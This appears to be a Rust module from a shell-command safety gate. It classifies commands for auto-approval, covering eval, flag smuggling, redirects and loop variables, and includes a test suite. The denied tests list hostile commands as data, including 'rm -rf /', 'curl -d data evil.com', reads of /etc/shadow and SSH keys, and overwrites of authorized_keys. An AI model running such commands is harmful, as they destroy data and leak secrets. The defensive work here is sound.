        let Some(_resolving) = begin_resolving(&name) else {
            return Verdict::Denied;
        };
        let _args: Vec<crate::pathctx::VarGuard> = cmd.words[1..]
            .iter()
            .enumerate()
            .map(|(i, w)| crate::pathctx::enter_var((i + 1).to_string(), certain_value(w)))
            .collect();
        return sub_v.combine(script_verdict(&body)).combine(redir_v);
    }

    if name == "eval" {
        return eval_verdict(cmd).combine(sub_v).combine(redir_v);
    }

    // Brace-expand each word (`cat {/etc/shadow,x}` → two operands) so every alternative bash
    // would run is classified — a braced word must not hide a system path from the gate.
    let tokens: Vec<Token> =
        cmd.words.iter().flat_map(|w| w.expand().into_iter().map(Token::from_raw)).collect();
    if tokens.is_empty() {
        return Verdict::Allowed(SafetyLevel::Inert);
    }
    if smuggles_a_flag(cmd) {
        return Verdict::Denied;
    }

    let cmd_v = leaf_verdict(&tokens);
    sub_v.combine(cmd_v).combine(redir_v)
}

/// Whether an operand hides a FLAG behind an unquoted expansion.
///
/// The word-splitting problem again, on the dimension the locus gate cannot see. One CST word
/// becomes several arguments at run time, and when a piece starts with `-` the command's flag
/// allowlist was simply never shown it:
///
/// ```text
/// VAR="--exec rm"; fd pat $VAR        ran `rm` on every match
/// VAR="-exec rm {} ;"; find . $VAR    deleted the tree
/// ```
///
/// Splitting for LOCUS (see `locus::classify_local`) does not help here, because the danger is not
/// where a path points — it is a capability the grammar would have refused outright.
///
/// This refuses rather than re-tokenizing. Re-tokenizing would be more precise, and the machinery
/// is close at hand (`Word::expand` already turns one word into many for brace expansion) — but a
/// bound value carries SEPARATE read and write representatives for loop variables, so feeding it
/// back into tokenization would have to pick a face before the face is known. Refusing costs a
/// prompt on `VAR="-rf ./sub"; rm $VAR`, which is a rare way to write a command; see TODO.md.
///
/// Only UNQUOTED expansions split, so `cat "$VAR"` with a spacey filename is untouched — a quoted
/// expansion is one word to the shell too.
fn smuggles_a_flag(cmd: &SimpleCmd) -> bool {
    cmd.words.iter().skip(1).any(|w| {
        // A top-level `Lit` is the unquoted case; a `DQuote` part is not split by the shell.
        w.0.iter().any(|part| {
            let WordPart::Lit(raw) = part else { return false };
            if !raw.contains('$') {
                return false;
            }
            let expanded = crate::pathctx::expand_vars(raw, false);
            expanded.split([' ', '\t', '\n']).skip(1).any(|piece| piece.starts_with('-'))
                || (expanded.split([' ', '\t', '\n']).count() > 1
                    && expanded.starts_with('-'))
        })
    })
}

/// The command leaf's verdict. The behavioral-capability engine is authoritative for every
/// command it can resolve; the legacy classifier handles the rest (`…-engine` §4). There is
/// no opt-out — the engine is the default and only path.
fn leaf_verdict(tokens: &[Token]) -> Verdict {
    let legacy = handlers::dispatch(tokens);
    crate::engine::bridge::engine_verdict(tokens).unwrap_or(legacy)
}

fn eval_verdict(cmd: &SimpleCmd) -> Verdict {
    if cmd.words.len() < 2 {
        return Verdict::Denied;
    }
    for arg in &cmd.words[1..] {
        if !arg_is_eval_safe(arg) {
            return Verdict::Denied;
        }
    }
    Verdict::Allowed(SafetyLevel::Inert)
}

fn arg_is_eval_safe(word: &Word) -> bool {
    let mut found_safe = false;
    for part in &word.0 {
        match part {
            WordPart::Lit(s) | WordPart::SQuote(s) => {
                if !s.chars().all(char::is_whitespace) {
                    return false;
                }
            }
            WordPart::Escape(c) => {
                if !c.is_whitespace() {
                    return false;
                }
            }
            WordPart::CmdSub(script) => {
                if !script_yields_eval_safe(script) {
                    return false;
                }
                found_safe = true;
            }
            WordPart::Backtick(raw) => {
                let Some(script) = parse(raw) else {
                    return false;
                };
                if !script_yields_eval_safe(&script) {
                    return false;
                }
                found_safe = true;
            }
            WordPart::DQuote(inner) => {
                if !arg_is_eval_safe(inner) {
                    return false;
                }
                if has_substitution(inner) {
                    found_safe = true;
                }
            }
            WordPart::ProcSub(_) | WordPart::Arith(_) => return false,
        }
    }
    found_safe
}

fn script_yields_eval_safe(script: &Script) -> bool {
    if script.0.len() != 1 {
        return false;
    }
    let stmt = &script.0[0];
    if !matches!(stmt.op, None | Some(ListOp::Semi)) {
        return false;
    }
    let pipeline = &stmt.pipeline;
    if pipeline.bang || pipeline.commands.len() != 1 {
        return false;
    }
    let Cmd::Simple(s) = &pipeline.commands[0] else {
        return false;
    };
    if !s.env.is_empty() {
        return false;
    }
    // A redirect inside the substitution is allowed only if it's inert:
    // stderr suppression (`2>/dev/null`), an fd dup (`2>&1`), or `/dev/null`.
    // A redirect that writes a real file is SafeWrite, not inert, so
    // `mise activate bash > evil` is rejected — eval-safe must not gain a
    // file-write side effect, and diverting stdout to a file is pointless here.
    if redirect_verdict(&s.redirs) != Verdict::Allowed(SafetyLevel::Inert) {
        return false;
    }
    for w in &s.words {
        if !word_is_plain_literal(w) {
            return false;
        }
    }
    let tokens: Vec<Token> =
        s.words.iter().flat_map(|w| w.expand().into_iter().map(Token::from_raw)).collect();
    if tokens.is_empty() {
        return false;
    }
    crate::registry::is_eval_safe_invocation(&tokens)
}

/// True iff every character of `word` is drawn from the bare-literal
/// alphabet: ASCII alphanumerics plus `_`, `-`, `.`, `/`, `=`. Words
/// matching this shape consist entirely of identifier-style or
/// path-style tokens that the shell will pass through to the
/// substituted command unchanged at runtime.
///
/// Required for words inside eval-safe substitutions because the
/// "stdout is shell-init code" trust depends on the contributor having
/// vetted what gets passed to the tool. Restricting the alphabet to
/// chars with no shell-expansion semantics keeps the substituted
/// invocation static across parse-time and runtime — what you see in
/// the source is what the tool receives.
fn word_is_plain_literal(word: &Word) -> bool {
    word.0.iter().all(part_is_plain_literal)
}

fn part_is_plain_literal(part: &WordPart) -> bool {
    match part {
        WordPart::Lit(s) | WordPart::SQuote(s) => s.chars().all(is_bare_literal_char),
        WordPart::Escape(c) => is_bare_literal_char(*c),
        WordPart::DQuote(inner) => word_is_plain_literal(inner),
        WordPart::CmdSub(_) | WordPart::ProcSub(_) | WordPart::Backtick(_) | WordPart::Arith(_) => false,
    }
}

/// Bare-literal alphabet: ASCII alphanumerics plus a tight punctuation
/// set covering identifiers (`_`, `-`), versions / paths (`.`, `/`),
/// and the long-flag value form (`=`). New chars require an explicit
/// eval-safe use case — add by extending this match, never by
/// excluding individual hostile chars.
fn is_bare_literal_char(c: char) -> bool {
    c.is_ascii_alphanumeric() || matches!(c, '_' | '-' | '.' | '/' | '=')
}

pub(crate) fn check_redirects(redirs: &[Redir]) -> bool {
    redirs.iter().all(|r| match r {
        // `<>` opens for writing too, so it faces the same `/dev/null`-only bar as `>`.
        Redir::Write { target, .. } | Redir::ReadWrite { target, .. } => target.eval() == "/dev/null",
        Redir::Read { .. }
        | Redir::HereStr(_)
        | Redir::HereDoc { .. }
        | Redir::DupFd { .. } => true,
    })
}

/// Whether a redirect *write* target is one we can auto-approve. Delegates to the SAME location
/// model + user grants the engine's file writers (`cp`/`mv`/`tee`/…) use, so a `> ~/file` honors
/// a home grant exactly like `cp ./a ~/file`; `/tmp` and `/dev/stdout` stay writable; and
/// `.git`/`.envrc`, home, absolute system paths, `..` escapes, and `$`-unpinnable targets stay
/// frozen (a redirect there can plant a git hook, an SSH key, or a direnv script that runs
/// later). Relative targets resolve against the harness cwd/root inside `write_target_verdict`.
fn is_safe_write_target(path: &str) -> bool {
    crate::engine::resolve::write_target_verdict(path).is_allowed()
}

/// The verdict for a redirect that OPENS `target` for writing.
fn write_face(target: &Word) -> Verdict {
    let t = target.eval();
    if t == "/dev/null" {
        // Inert: no side effect, no promotion.
        Verdict::Allowed(SafetyLevel::Inert)
    } else if is_safe_write_target(&t) {
        Verdict::Allowed(SafetyLevel::SafeWrite)
    } else {
        Verdict::Denied
    }
}

/// The verdict for a redirect that OPENS `target` for reading. Gates the SOURCE by its read locus,
/// like an operand read: `cat < /etc/shadow` must deny just as `cat /etc/shadow` does. A
/// substitution-derived source names an unknowable file → fail-closed to Denied.
fn read_face(target: &Word) -> Verdict {
    let t = target.eval();
    // Keyed on the EVALUATED value rather than on "is there a substitution part", so a
    // substitution whose inner command declared its output locus (`< $(pwd)/f`) is gated by that
    // locus, while an undeclared one still fail-closes on its opaque marker.
    if is_opaque_value(&t) {
        Verdict::Denied
    } else {
        crate::engine::resolve::read_content_verdict(&t)
    }
}

pub(crate) fn redirect_verdict(redirs: &[Redir]) -> Verdict {
    let mut level = Verdict::Allowed(SafetyLevel::Inert);
    for r in redirs {
        match r {
            Redir::Write { target, .. } => {
                level = level.combine(word_sub_verdict(target));
                level = level.combine(write_face(target));
            }
            Redir::Read { target, .. } => {
                level = level.combine(word_sub_verdict(target));
                level = level.combine(read_face(target));
            }
            // `<>` opens the target BOTH ways, so it takes both gates. Taking only one would let
            // the other face through: the write gate alone misses reading a secret, and the read
            // gate alone misses overwriting a file that is merely readable.
            Redir::ReadWrite { target, .. } => {
                level = level.combine(word_sub_verdict(target));
                level = level.combine(write_face(target));
                level = level.combine(read_face(target));
            }
            Redir::HereStr(word) => {
                level = level.combine(word_sub_verdict(word));
            }
            // A heredoc body is inert ONLY behind a quoted delimiter. With a bare `<<EOF` the shell
            // expands the body, so a substitution in it runs and is classified exactly like one in
            // any other word. `body` is empty for the quoted spellings, so this is a no-op there.
            Redir::HereDoc { body, .. } => {
                level = level.combine(word_sub_verdict(body));
            }
            Redir::DupFd { .. } => {}
        }
    }
    level
}

fn has_substitution(word: &Word) -> bool {
    word.0.iter().any(|p| match p {
        WordPart::CmdSub(_) | WordPart::ProcSub(_) | WordPart::Backtick(_) | WordPart::Arith(_) => true,
        WordPart::DQuote(inner) => has_substitution(inner),
        _ => false,
    })
}

#[cfg(test)]
mod tests {
    use super::*;

    fn check(cmd: &str) -> bool {
        is_safe_command(cmd)
    }

    #[test]
    fn loop_variable_inherits_the_list_locus() {
        // A worktree `in`-list → the body reads/writes the worktree → allowed. The bare `$f`
        // used to fail-closed to machine; now it binds to the list, like find's `{}`→path.
        for cmd in [
            "for f in *.txt; do cat $f; done",
            "for f in *.txt; do rm $f; done",
            "for f in src/*.rs; do grep foo $f; done",
            "for f in *.log; do sed -i s/a/b/ $f; done",
            "for f in a b c; do cat $f.bak; done",
            "for x in 1 2 3; do rm $x; done",
            "for d in a b; do for f in $d/x; do cat $f; done; done", // nested loops compose
        ] {
            assert!(check(cmd), "worktree loop should allow: {cmd}");
        }
        // A system / credential / unpinnable `in`-list → deny (the body could touch it).
        for cmd in [
            "for f in /etc/*; do cat $f; done",
            "for f in /etc/*.conf; do rm $f; done",
            "for f in ~/.ssh/*; do cat $f; done",
            "for f in $LIST; do rm $f; done",
            "for f in $(find / -name x); do rm -rf $f; done",
            "for d in /etc; do for f in $d/x; do cat $f; done; done",
            // read-worst ≠ write-worst: reading must worst-case ~/notes even though the
            // write-worst item is /etc/hosts — a single representative would be unsound.
            "for f in /etc/hosts ~/notes; do cat $f; done",
        ] {
            assert!(!check(cmd), "non-worktree loop should deny: {cmd}");
        }
    }

    safe! {
        grep_foo: "grep foo file.txt",
        jq_key: "jq '.key' file.json",
        base64_d: "base64 -d",
        ls_la: "ls -la",
        wc_l: "wc -l file.txt",
        ps_aux: "ps aux",
        echo_hello: "echo hello",
        cat_file: "cat file.txt",

        version_go: "go --version",
        version_cargo: "cargo --version",
        version_cargo_redirect: "cargo --version 2>&1",
        help_cargo: "cargo --help",
        help_cargo_build: "cargo build --help",

        dev_null_echo: "echo hello > /dev/null",
        dev_null_stderr: "echo hello 2> /dev/null",
        dev_null_append: "echo hello >> /dev/null",
        dev_null_git_log: "git log > /dev/null 2>&1",
        fd_redirect_ls: "ls 2>&1",
        stdin_dev_null: "git log < /dev/null",

        env_prefix: "FOO='bar baz' ls -la",
        env_prefix_dq: "FOO=\"bar baz\" ls -la",
        env_rack_rspec: "RACK_ENV=test bundle exec rspec spec/foo_spec.rb",

        subst_echo_ls: "echo $(ls)",
        subst_ls_pwd: "ls `pwd`",
        subst_nested: "echo $(echo $(ls))",
        subst_quoted: "echo \"$(ls)\"",
        assign_subst_ls: "out=$(ls)",
        assign_subst_git: "out=$(git status)",
        assign_subst_multiple: "a=$(ls) b=$(pwd)",
        assign_subst_backtick: "out=`ls`",

        assign_bare_lit: "foo=bar",
        assign_bare_int: "x=1",
        assign_bare_empty: "x=",
        assign_bare_dq: "x=\"foo bar\"",
        assign_bare_sq: "x='foo bar'",
        assign_bare_param: "rc=$?",
        assign_bare_var: "x=$y",
        assign_bare_dollar_var_braced: "x=${y}",
        assign_bare_path: "PATH=/foo",
        assign_bare_multiple: "a=1 b=2 c=3",
        assign_bare_arith: "x=$((1 + 2))",
        assign_in_for_body: "for i in 1 2; do x=1; done",
        assign_rc_in_for_body: "for i in 1 2; do echo $i; rc=$?; done",
        assign_rc_in_while_body: "while test -f /tmp/x; do rc=$?; sleep 1; done",
        assign_rc_in_if_body: "if test -f foo; then rc=$?; fi",
        assign_then_use: "x=1; echo $x",
        assign_chained_with_safe: "x=1 && ls",
        assign_subshell: "(x=1)",
        assign_in_subshell_with_cmd: "(x=1; ls)",

        // A loop over a BOUNDED substitution. These are the positive half of the substitution
        // rule: the deny corpus only asserts that hot roots are refused, which a blanket refusal
        // would satisfy vacuously — so without these, reverting `loop_reprs` to its old
        // `__SAFE_CHAINS_` prefix test would silently re-deny the whole form and stay green.
        loop_over_bounded_sub: "for f in $(fd a app/); do cat $f; done",
        loop_over_bounded_sub_quoted: "for f in $(fd a app/); do cat \"$f\"; done",
        loop_over_bounded_sub_write: "for f in $(fd a app/); do echo hi > $f; done",
        loop_over_bounded_sub_pipeline: "for f in $(fd a app/ | head -3); do cat $f; done",
        loop_over_pwd: "for f in $(pwd); do cat $f; done",

        case_single_arm: "case x in x) echo a;; esac",
        case_alternation: "case $x in a|b) ls;; *) echo n;; esac",
        case_paren_prefixed_pattern: "case \"$1\" in (start) ls;; (stop) pwd;; esac",
        case_last_arm_without_terminator: "case x in x) echo a; esac",
        case_empty_body: "case x in x) ;; esac",
        case_multiline: "case \"$1\" in\n  start)\n    ls -la\n    ;;\n  *)\n    echo usage\n    ;;\nesac",
        case_in_substitution: "echo $(case A in *) echo a;; esac)",
        case_nested_in_if: "if true; then case x in a) ls;; esac; fi",
        clobber_redirect: "ls >| out.txt",
        clobber_redirect_fd: "ls 1>| out.txt",
        readwrite_redirect: "ls <> f.txt",
        readwrite_redirect_devnull: "ls <> /dev/null",

        subshell_echo: "(echo hello)",
        subshell_ls: "(ls)",
        subshell_chain: "(ls && echo done)",
        subshell_pipe: "(ls | grep foo)",
        subshell_nested: "((echo hello))",
        subshell_for: "(for x in 1 2; do echo $x; done)",

        pipe_grep_head: "grep foo file.txt | head -5",
        pipe_cat_sort_uniq: "cat file | sort | uniq",
        chain_ls_echo: "ls && echo done",
        semicolon_ls_echo: "ls; echo done",
        bg_ls_echo: "ls & echo done",
        newline_echo_echo: "echo foo\necho bar",

        stdin_read_from_path: "wc -l < /tmp/foo.log",
        stdin_read_in_subst: "while [ $(wc -l < /tmp/x) -lt 10 ]; do sleep 5; done",
        stdin_read_in_for_body: "for i in 1 2; do cat < /tmp/x; done",

        here_string_grep: "grep -c , <<< 'hello,world,test'",
        heredoc_cat: "cat <<EOF\nhello world\nEOF",
        heredoc_quoted: "cat <<'EOF'\nhello\nEOF",
        heredoc_strip_tabs: "cat <<-EOF\n\thello\nEOF",
        heredoc_no_content: "cat <<EOF",
        heredoc_pipe: "cat <<EOF | grep hello\nhello\nEOF",

        for_echo: "for x in 1 2 3; do echo $x; done",
        for_empty_body: "for x in 1 2 3; do; done",
        for_nested: "for x in 1 2; do for y in a b; do echo $x $y; done; done",
        for_safe_subst: "for x in $(seq 1 5); do echo $x; done",
        while_test: "while test -f /tmp/foo; do sleep 1; done",
        while_negation: "while ! test -f /tmp/done; do sleep 1; done",
        until_test: "until test -f /tmp/ready; do sleep 1; done",
        if_then_fi: "if test -f foo; then echo exists; fi",
        if_then_else_fi: "if test -f foo; then echo yes; else echo no; fi",
        if_elif: "if test -f a; then echo a; elif test -f b; then echo b; else echo c; fi",
        nested_if_in_for: "for x in 1 2; do if test $x = 1; then echo one; fi; done",
        bare_negation: "! echo hello",
        keyword_as_data: "echo for; echo done; echo if; echo fi",

        quoted_redirect: "echo 'greater > than' test",
        quoted_subst: "echo '$(safe)' arg",

        redirect_to_file: "echo hello > file.txt",
        redirect_append: "cat file >> output.txt",
        redirect_stderr_file: "ls 2> errors.txt",
        redirect_bidirectional_write: "cat < /tmp/x > /tmp/y",
        env_rails_redirect: "RAILS_ENV=test echo foo > bar",
        jj_diff_redirect_chain: "jj diff -r 'master..@' --context 5 > /tmp/review_diff.txt && wc -l /tmp/review_diff.txt",

        arith_basic: "echo $((1 + 2))",
        arith_with_var: "prev=$((ln - 1))",
        arith_nested_parens: "echo $(( (1 + 2) * 3 ))",
        arith_in_dquote: "echo \"line $((ln - 1))\"",
        arith_in_for_loop: "for i in 1 2; do echo $((i * 10)); done",

        dbracket_eq: "[[ \"a\" == \"a\" ]]",
        dbracket_neq: "[[ \"a\" != \"b\" ]]",
        dbracket_file_test: "[[ -f /tmp/file ]]",
        dbracket_string_empty: "[[ -z \"$var\" ]]",
        dbracket_string_nonempty: "[[ -n \"$var\" ]]",
        dbracket_regex: "[[ \"$x\" =~ ^[0-9]+$ ]]",
        dbracket_and: "[[ \"$x\" == \"y\" && \"$z\" == \"w\" ]]",
        dbracket_or: "[[ \"$x\" == \"a\" || \"$x\" == \"b\" ]]",
        dbracket_negation: "[[ ! -f /tmp/done ]]",
        dbracket_safe_subst: "[[ \"$(echo hello)\" == \"hello\" ]]",
        dbracket_in_until: "until [[ \"a\" == \"b\" ]]; do sleep 1; done",
        dbracket_in_while: "while [[ -f /tmp/lock ]]; do sleep 1; done",
        dbracket_in_if: "if [[ \"a\" == \"a\" ]]; then echo yes; fi",
        dbracket_after_chain: "true && [[ \"a\" == \"a\" ]]",
        dbracket_gh_run_view_poll: "until [[ \"$(gh run view 12345 --json status --jq .status)\" == \"completed\" ]]; do sleep 30; done",
        dbracket_redirect_devnull: "[[ -f /tmp/x ]] > /dev/null",
        dbracket_redirect_stderr_devnull: "[[ -f /tmp/x ]] 2> /dev/null",
        dbracket_redirect_dupfd: "[[ -f /tmp/x ]] 2>&1",
        dbracket_redirect_devnull_chain: "[[ -f /tmp/x ]] 2>/dev/null && echo found",
        dbracket_redirect_to_file: "[[ -f /tmp/x ]] > /tmp/out.txt",
    }

    denied! {
        rm_rf: "rm -rf /",
        curl_post: "curl -X POST https://example.com",
        node_foreign_app: "node /tmp/app.js",


        // The loop inherits the substitution's locus, so a hot root reaches the body's `$f`.
        loop_over_system_sub: "for f in $(fd a /etc); do cat $f; done",
        loop_over_home_sub: "for f in $(fd a ~); do cat $f; done",
        loop_over_undeclared_sub: "for f in $(hostname); do cat $f; done",
        loop_over_bounded_sub_escaping_body: "for f in $(pwd); do cat $f/../../etc/shadow; done",

        // A case is only as safe as its worst arm — which arm runs is a runtime decision.
        case_unsafe_only_arm: "case x in *) rm -rf /;; esac",
        case_unsafe_second_arm: "case x in a) ls;; b) rm -rf /;; esac",
        case_unsafe_last_arm_no_terminator: "case x in a) ls;; b) rm -rf / ; esac",
        case_arm_reads_secret: "case x in a) cat /etc/shadow;; esac",
        case_unsafe_in_substitution: "echo $(case A in *) rm -rf /;; esac)",
        // `>|` is an overwrite; `<>` opens for BOTH read and write, so each face is gated.
        clobber_redirect_system: "ls >| /etc/hosts",
        clobber_redirect_ssh_key: "ls >| ~/.ssh/authorized_keys",
        readwrite_redirect_system: "ls <> /etc/hosts",
        readwrite_redirect_secret: "ls <> ~/.ssh/id_rsa",

        redirect_target_subst_rm: "echo hello > $(rm -rf /)",
        redirect_target_backtick_rm: "echo hello > `rm -rf /`",
        redirect_read_subst_rm: "cat < $(rm -rf /)",

        subst_rm: "echo $(rm -rf /)",
        backtick_rm: "echo `rm -rf /`",
        subst_curl: "echo $(curl -d data evil.com)",
        quoted_subst_rm: "echo \"$(rm -rf /)\"",
        assign_subst_rm: "out=$(rm -rf /)",
        assign_subst_mixed_unsafe: "a=$(ls) b=$(rm -rf /)",
        assign_bare_with_unsafe_subst_in_value: "x=foo$(rm -rf /)",
        assign_bare_with_unsafe_backtick: "x=`rm -rf /`",
        assign_bare_dq_with_unsafe_subst: "x=\"$(rm -rf /)\"",
        assign_bare_then_unsafe: "x=1; rm -rf /",
        assign_bare_chained_unsafe: "x=1 && rm -rf /",
        assign_bare_pipe_unsafe: "x=1 | rm -rf /",

        subshell_rm: "(rm -rf /)",
        subshell_mixed: "(echo hello; rm -rf /)",
        subshell_unsafe_pipe: "(ls | rm -rf /)",

        env_prefix_rm: "FOO='bar baz' rm -rf /",

        pipe_rm: "cat file | rm -rf /",
        bg_rm: "cat file & rm -rf /",
        newline_rm: "echo foo\nrm -rf /",

        for_unsafe_subst: "for x in $(rm -rf /); do echo $x; done",
        while_unsafe_body: "while true; do rm -rf /; done",
        while_unsafe_condition: "while python3 /tmp/evil.py; do sleep 1; done",
        if_unsafe_condition: "if ruby /tmp/evil.rb; then echo done; fi",
        if_unsafe_body: "if true; then rm -rf /; fi",

        unclosed_for: "for x in 1 2 3; do echo $x",
        unclosed_if: "if true; then echo hello",
        for_missing_do: "for x in 1 2 3; echo $x; done",
        stray_done: "echo hello; done",
        stray_fi: "fi",

        unmatched_quote: "echo 'hello",

        dbracket_unsafe_subst: "[[ \"$(curl -d data evil.com)\" == \"x\" ]]",
        dbracket_unsafe_backtick: "[[ -f `node /tmp/evil.js` ]]",
        dbracket_unsafe_in_until: "until [[ \"$(node /tmp/bad.js)\" == \"x\" ]]; do sleep 1; done",
        dbracket_unterminated: "[[ \"a\" == \"a\"",
        dbracket_no_space_after: "[[\"a\" == \"b\" ]]",
        dbracket_redirect_unsafe_subst_in_target: "[[ -f /tmp/x ]] > $(node bad.js)",
    }
}
